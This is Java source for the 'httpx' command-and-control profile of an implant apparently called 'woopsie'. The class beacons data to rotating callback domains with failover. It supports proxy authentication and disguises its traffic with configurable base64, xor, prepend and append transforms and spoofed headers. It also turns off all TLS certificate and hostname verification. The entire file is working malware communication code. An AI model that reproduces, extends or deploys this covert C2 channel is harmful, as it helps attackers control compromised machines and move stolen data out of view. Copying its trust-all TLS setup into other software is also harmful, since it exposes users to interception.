package com.woopsie.profiles;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.hc.client5.http.impl.routing.DefaultProxyRoutePlanner;
import org.apache.hc.core5.http.HttpHost;
import org.apache.hc.core5.http.ContentType;
import org.apache.hc.core5.http.io.entity.ByteArrayEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.client5.http.auth.AuthScope;
import org.apache.hc.client5.http.auth.UsernamePasswordCredentials;
import org.apache.hc.client5.http.impl.auth.BasicCredentialsProvider;
import org.apache.hc.client5.http.ssl.SSLConnectionSocketFactory;
import org.apache.hc.client5.http.ssl.TrustAllStrategy;
import org.apache.hc.client5.http.ssl.NoopHostnameVerifier;
import org.apache.hc.core5.ssl.SSLContextBuilder;
import javax.net.ssl.SSLContext;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Advanced HTTPX profile with domain rotation, multiple URIs, and transforms
 */
public class HttpxProfile implements C2Profile {
    private final Config config;
    private final CloseableHttpClient httpClient;
    private final ObjectMapper objectMapper;
    private byte[] aesKey;
    
    // Httpx-specific configuration
    private final List<String> callbackDomains;
    private final String domainRotation;
    private final int failoverThreshold;
    private final HttpxConfig httpxConfig;
    private int roundRobinIndex = 0;
    
    public HttpxProfile(Config config) {
        this.config = config;
        this.httpClient = buildHttpClient(config);
        this.objectMapper = new ObjectMapper();
        this.aesKey = null;
        
        // Parse httpx configuration from config
        this.callbackDomains = parseCallbackDomains();
        this.domainRotation = config.getDomainRotation();
        this.failoverThreshold = config.getFailoverThreshold();
        this.httpxConfig = parseHttpxConfig();
        
        Config.debugLog(config, "HTTPX Profile initialized:");
        Config.debugLog(config, "  Domains: " + callbackDomains);
        Config.debugLog(config, "  Rotation: " + domainRotation);
        Config.debugLog(config, "  Failover threshold: " + failoverThreshold);
    }
    
    private static CloseableHttpClient buildHttpClient(Config config) {
        try {
            HttpClientBuilder builder = HttpClients.custom();
            
            // Disable SSL certificate verification (like oopsie's danger_accept_invalid_certs)
            SSLContext sslContext = SSLContextBuilder.create()
                .loadTrustMaterial(new TrustAllStrategy())
                .build();
            SSLConnectionSocketFactory sslSocketFactory = new SSLConnectionSocketFactory(
                sslContext,
                NoopHostnameVerifier.INSTANCE
            );
            builder.setConnectionManager(
                org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManagerBuilder.create()
                    .setSSLSocketFactory(sslSocketFactory)
                    .setValidateAfterInactivity(org.apache.hc.core5.util.Timeout.ofSeconds(2))
                    .build()
            );
            
            // Enable automatic retry on connection failures (especially for proxy issues)
            builder.setRetryStrategy(new org.apache.hc.client5.http.impl.DefaultHttpRequestRetryStrategy(
                3, // max 3 retries
                org.apache.hc.core5.util.TimeValue.ofMilliseconds(100) // 100ms delay between retries
            ));
            
            // Configure proxy if set
            if (config.hasProxy()) {
                HttpHost proxy = new HttpHost(config.getProxyHost(), config.getProxyPort());
                DefaultProxyRoutePlanner routePlanner = new DefaultProxyRoutePlanner(proxy);
                builder.setRoutePlanner(routePlanner);
                
                Config.debugLog(config, "Configuring HTTPX proxy: " + config.getProxyHost() + ":" + config.getProxyPort());
                
                // Add proxy authentication if credentials provided
                if (config.getProxyUser() != null && !config.getProxyUser().isEmpty()) {
                    BasicCredentialsProvider credsProvider = new BasicCredentialsProvider();
                    credsProvider.setCredentials(
                        new AuthScope(proxy),
                        new UsernamePasswordCredentials(config.getProxyUser(), config.getProxyPass().toCharArray())
                    );
                    builder.setDefaultCredentialsProvider(credsProvider);
                    Config.debugLog(config, "Proxy authentication configured for user: " + config.getProxyUser());
                }
            }
            
            return builder.build();
        } catch (Exception e) {
            throw new RuntimeException("Failed to create HTTP client", e);
        }
    }
    
    private List<String> parseCallbackDomains() {
        try {
            String domainsJson = config.getCallbackDomains();
            if (domainsJson != null && !domainsJson.isEmpty()) {
                JsonNode domains = objectMapper.readTree(domainsJson);
                List<String> result = new ArrayList<>();
                if (domains.isArray()) {
                    for (JsonNode domain : domains) {
                        result.add(domain.asText());
                    }
                }
                return result;
            }
        } catch (Exception e) {
            Config.debugLog(config, "Failed to parse callback domains: " + e.getMessage());
        }
        // Fallback to single callback host
        return Collections.singletonList(config.getCallbackUrl());
    }
    
    private HttpxConfig parseHttpxConfig() {
        try {
            String rawC2Config = config.getRawC2Config();
            Config.debugLog(config, "Parsing raw_c2_config: " + (rawC2Config != null ? rawC2Config.substring(0, Math.min(100, rawC2Config.length())) + "..." : "null"));
            
            if (rawC2Config != null && !rawC2Config.isEmpty()) {
                // Configure ObjectMapper to allow unescaped control characters and backslash escapes
                ObjectMapper lenientMapper = new ObjectMapper();
                lenientMapper.configure(com.fasterxml.jackson.core.JsonParser.Feature.ALLOW_UNQUOTED_CONTROL_CHARS, true);
                lenientMapper.configure(com.fasterxml.jackson.core.JsonParser.Feature.ALLOW_BACKSLASH_ESCAPING_ANY_CHARACTER, true);
                lenientMapper.configure(com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
                
                JsonNode configNode = lenientMapper.readTree(rawC2Config);
                HttpxConfig parsed = lenientMapper.treeToValue(configNode, HttpxConfig.class);
                
                Config.debugLog(config, "Parsed httpx config:");
                Config.debugLog(config, "  post endpoint: " + (parsed.post != null ? "present" : "null"));
                if (parsed.post != null) {
                    Config.debugLog(config, "    uris: " + parsed.post.uris);
                }
                
                return parsed;
            }
        } catch (Exception e) {
            Config.debugLog(config, "Failed to parse httpx config: " + e.getMessage());
            e.printStackTrace();
        }
        Config.debugLog(config, "Using empty httpx config as fallback");
        return new HttpxConfig(); // Return empty config as fallback
    }
    
    @Override
    public String send(String data) throws Exception {
        String domain = selectDomain();
        String uri = selectUri();
        String url = domain + uri;
        
        Config.debugLog(config, "HTTPX POST to: " + url);
        Config.debugLog(config, "  Selected domain: " + domain);
        Config.debugLog(config, "  Selected URI: " + uri);
        
        // Apply rotation strategy
        switch (domainRotation.toLowerCase()) {
            case "round-robin":
            case "random":
                return sendToSingleDomain(url, data);
            case "fail-over":
            default:
                return sendWithFailover(data);
        }
    }
    
    private String sendToSingleDomain(String url, String data) throws Exception {
        // Apply client transforms
        byte[] transformedData = applyClientTransforms(data.getBytes(StandardCharsets.UTF_8));
        
        HttpPost post = new HttpPost(url);
        
        // Set all headers from config (includes User-Agent and any custom headers)
        Map<String, String> headers = config.getHeaders();
        if (headers != null) {
            for (Map.Entry<String, String> header : headers.entrySet()) {
                post.setHeader(header.getKey(), header.getValue());
                Config.debugLog(config, "Setting header: " + header.getKey() + ": " + header.getValue());
            }
        }
        
        // Override/add headers from httpx config if specified
        if (httpxConfig.post != null && httpxConfig.post.client != null && 
            httpxConfig.post.client.headers != null) {
            for (Map.Entry<String, String> header : httpxConfig.post.client.headers.entrySet()) {
                post.setHeader(header.getKey(), header.getValue());
                Config.debugLog(config, "Setting httpx header: " + header.getKey() + ": " + header.getValue());
            }
        }
        
        // Always set Content-Type last
        post.setHeader("Content-Type", "application/json");
        
        // Send raw bytes directly (matches oopsie's request.body(data) behavior)
        post.setEntity(new ByteArrayEntity(transformedData, ContentType.APPLICATION_JSON));
        Config.debugLog(config, "  Sending " + transformedData.length + " bytes as body");
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            int statusCode = response.getCode();
            byte[] responseBytes = EntityUtils.toByteArray(response.getEntity());
            
            Config.debugLog(config, "HTTPX response status: " + statusCode);
            
            if (statusCode >= 200 && statusCode < 300) {
                Config.debugLog(config, "  Response size: " + responseBytes.length + " bytes");
                Config.debugLog(config, "  Response (first 100 chars): " + 
                    new String(responseBytes, 0, Math.min(100, responseBytes.length), StandardCharsets.UTF_8));
                
                // Apply server transforms (reverse)
                byte[] untransformedData = applyServerTransforms(responseBytes);
                return new String(untransformedData, StandardCharsets.UTF_8);
            } else {
                throw new Exception("HTTPX request failed with status: " + statusCode);
            }
        }
    }
    
    private String sendWithFailover(String data) throws Exception {
        Exception lastException = null;
        
        for (String domain : callbackDomains) {
            String uri = selectUri();
            String url = domain + uri;
            
            for (int attempt = 0; attempt < failoverThreshold; attempt++) {
                try {
                    Config.debugLog(config, "Failover attempt " + (attempt + 1) + " to " + url);
                    return sendToSingleDomain(url, data);
                } catch (Exception e) {
                    Config.debugLog(config, "Attempt failed: " + e.getMessage());
                    lastException = e;
                }
            }
        }
        
        throw lastException != null ? lastException : new Exception("All domains failed");
    }
    
    private String selectDomain() {
        if (callbackDomains.isEmpty()) {
            return config.getCallbackUrl();
        }
        
        switch (domainRotation.toLowerCase()) {
            case "random":
                return callbackDomains.get(new Random().nextInt(callbackDomains.size()));
            case "round-robin":
                String domain = callbackDomains.get(roundRobinIndex % callbackDomains.size());
                roundRobinIndex++;
                return domain;
            case "fail-over":
            default:
                return callbackDomains.get(0);
        }
    }
    
    private String selectUri() {
        if (httpxConfig.post != null && httpxConfig.post.uris != null && !httpxConfig.post.uris.isEmpty()) {
            // Randomly select from available URIs
            return httpxConfig.post.uris.get(new Random().nextInt(httpxConfig.post.uris.size()));
        }
        
        Config.debugLog(config, "WARNING: No URIs in httpx config, using fallback");
        Config.debugLog(config, "  httpxConfig.post: " + httpxConfig.post);
        if (httpxConfig.post != null) {
            Config.debugLog(config, "  httpxConfig.post.uris: " + httpxConfig.post.uris);
        }
        
        String fallbackUri = config.getPostUri();
        if (fallbackUri == null || fallbackUri.isEmpty()) {
            // Last resort - use default URI
            Config.debugLog(config, "  No fallback URI, using default /");
            return "/";
        }
        return fallbackUri;
    }
    
    private byte[] applyClientTransforms(byte[] data) {
        if (httpxConfig.post == null || httpxConfig.post.client == null || 
            httpxConfig.post.client.transforms == null) {
            Config.debugLog(config, "No client transforms to apply");
            return data;
        }
        
        Config.debugLog(config, "Applying " + httpxConfig.post.client.transforms.size() + " client transforms");
        byte[] result = data;
        for (Transform transform : httpxConfig.post.client.transforms) {
            try {
                Config.debugLog(config, "  Applying transform: " + transform.action + " (value: " + 
                    (transform.value != null && transform.value.length() > 20 ? transform.value.substring(0, 20) + "..." : transform.value) + ")");
                result = applyTransform(result, transform);
                Config.debugLog(config, "  Result size: " + result.length + " bytes");
            } catch (Exception e) {
                Config.debugLog(config, "Transform failed: " + transform.action + " - " + e.getMessage());
                e.printStackTrace();
            }
        }
        return result;
    }
    
    private byte[] applyServerTransforms(byte[] data) {
        if (httpxConfig.post == null || httpxConfig.post.server == null || 
            httpxConfig.post.server.transforms == null) {
            return data;
        }
        
        byte[] result = data;
        // Server transforms are applied in reverse
        List<Transform> transforms = httpxConfig.post.server.transforms;
        Config.debugLog(config, "Applying " + transforms.size() + " server transforms (reverse order)");
        
        for (int i = transforms.size() - 1; i >= 0; i--) {
            try {
                Config.debugLog(config, "  Reversing transform " + (i+1) + ": " + transforms.get(i).action);
                Config.debugLog(config, "    Input size: " + result.length + " bytes, first 50 chars: " + 
                    new String(result, 0, Math.min(50, result.length), StandardCharsets.UTF_8));
                result = applyTransformReverse(result, transforms.get(i));
                Config.debugLog(config, "    Output size: " + result.length + " bytes");
            } catch (Exception e) {
                Config.debugLog(config, "Reverse transform failed: " + transforms.get(i).action + " - " + e.getMessage());
                throw new RuntimeException(e);
            }
        }
        return result;
    }
    
    private byte[] applyTransform(byte[] data, Transform transform) throws Exception {
        switch (transform.action.toLowerCase()) {
            case "base64":
                // Encode to String then get UTF-8 bytes (matches oopsie behavior)
                return Base64.getEncoder().encodeToString(data).getBytes(StandardCharsets.UTF_8);
            case "base64url":
                // Encode to String then get UTF-8 bytes (matches oopsie behavior)
                // Use URL encoder WITH padding (Rust's BASE64_URL_SAFE includes padding)
                String encoded = Base64.getUrlEncoder().encodeToString(data);
                Config.debugLog(config, "  Base64url output (first 100 chars): " + 
                    (encoded.length() > 100 ? encoded.substring(0, 100) + "..." : encoded));
                Config.debugLog(config, "  Base64url output (last 100 chars): " + 
                    (encoded.length() > 100 ? "..." + encoded.substring(encoded.length() - 100) : encoded));
                return encoded.getBytes(StandardCharsets.UTF_8);
            case "prepend":
                return concatenate(transform.value.getBytes(StandardCharsets.UTF_8), data);
            case "append":
                return concatenate(data, transform.value.getBytes(StandardCharsets.UTF_8));
            case "xor":
                return xor(data, transform.value.getBytes(StandardCharsets.UTF_8));
            default:
                Config.debugLog(config, "Unknown transform: " + transform.action);
                return data;
        }
    }
    
    private byte[] applyTransformReverse(byte[] data, Transform transform) throws Exception {
        switch (transform.action.toLowerCase()) {
            case "base64":
                return Base64.getDecoder().decode(data);
            case "base64url":
                String dataStr = new String(data, StandardCharsets.UTF_8);
                Config.debugLog(config, "  Base64url input: " + 
                    (dataStr.length() > 200 ? dataStr.substring(0, 100) + "..." + dataStr.substring(dataStr.length() - 100) : dataStr));
                return Base64.getUrlDecoder().decode(data);
            case "prepend":
                int prependLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
                Config.debugLog(config, "  Stripping " + prependLen + " bytes from start");
                
                if (prependLen >= data.length) {
                    Config.debugLog(config, "  Prepend already stripped (data too small), skipping");
                    return data;
                }
                
                int startPos = prependLen;
                while (startPos < data.length && data[startPos] != '\r' && data[startPos] != '\n') {
                    startPos++;
                }
                // Skip past the line separator(s)
                while (startPos < data.length && (data[startPos] == '\r' || data[startPos] == '\n')) {
                    startPos++;
                }
                
                Config.debugLog(config, "  Advanced to position " + startPos + " (skipped " + (startPos - prependLen) + " trailing bytes)");
                byte[] afterPrependStrip = Arrays.copyOfRange(data, startPos, data.length);
                String prependPreview = new String(Arrays.copyOfRange(afterPrependStrip, 0, Math.min(100, afterPrependStrip.length)), StandardCharsets.UTF_8);
                Config.debugLog(config, "  After prepend strip (size " + afterPrependStrip.length + "): " + prependPreview);
                return afterPrependStrip;
            case "append":
                int appendLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
                byte[] afterAppendStrip = Arrays.copyOfRange(data, 0, data.length - appendLen);
                String appendPreview = new String(Arrays.copyOfRange(afterAppendStrip, 0, Math.min(100, afterAppendStrip.length)), StandardCharsets.UTF_8);
                Config.debugLog(config, "  After append strip (size " + afterAppendStrip.length + "): " + appendPreview);
                return afterAppendStrip;
            case "xor":
                return xor(data, transform.value.getBytes(StandardCharsets.UTF_8));
            default:
                Config.debugLog(config, "Unknown reverse transform: " + transform.action);
                return data;
        }
    }
    
    private byte[] concatenate(byte[] a, byte[] b) {
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }
    
    private byte[] xor(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    @Override
    public byte[] getAesKey() {
        return aesKey;
    }
    
    @Override
    public void setAesKey(byte[] key) {
        this.aesKey = key;
    }
    
    @Override
    public String getProfileName() {
        return "httpx";
    }
    
    // Configuration classes for httpx
    static class HttpxConfig {
        public String name;
        public Endpoint post;
        public Endpoint get;
    }
    
    static class Endpoint {
        public String verb;
        public List<String> uris = new ArrayList<>();
        public EndpointClient client;
        public EndpointServer server;
    }
    
    static class EndpointClient {
        public Map<String, String> headers;
        public Map<String, String> parameters;
        public C2Message message;
        public List<Transform> transforms;
    }
    
    static class EndpointServer {
        public Map<String, String> headers;
        public List<Transform> transforms;
        public C2Message message;
    }
    
    static class C2Message {
        public String location;
        public String name;
    }
    
    static class Transform {
        public String action;
        public String value;
    }
}
